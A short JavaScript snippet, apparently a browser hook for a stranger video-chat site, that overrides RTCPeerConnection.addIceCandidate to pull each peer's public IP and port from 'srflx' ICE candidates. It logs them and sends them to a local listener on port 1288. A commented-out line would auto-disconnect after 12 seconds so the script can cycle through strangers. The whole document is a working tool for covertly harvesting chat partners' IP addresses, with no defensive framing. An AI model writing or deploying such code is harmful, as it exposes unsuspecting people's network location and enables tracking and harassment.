let interv = 0;
window.oRTCPeerConnection  = window.oRTCPeerConnection || window.RTCPeerConnection
window.RTCPeerConnection = function(...args) {
    const pc = new window.oRTCPeerConnection(...args)
    pc.oaddIceCandidate = pc.addIceCandidate
    pc.addIceCandidate = function(iceCandidate, ...rest) {
        const fields = iceCandidate.candidate.split(' ')
        if (fields[7] === 'srflx') {
            console.log(fields);
            fetch(`http://localhost:1288/${fields[4]}?local=${fields[9]}`);
            if(interv) clearTimeout(interv);
            // Remove comment to disconnect after N seconds // interv = setTimeout(()=>{document.getElementsByClassName("disconnectbtn")[0].click();document.getElementsByClassName("disconnectbtn")[0].click();}, 12000);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest)
    }
    return pc
}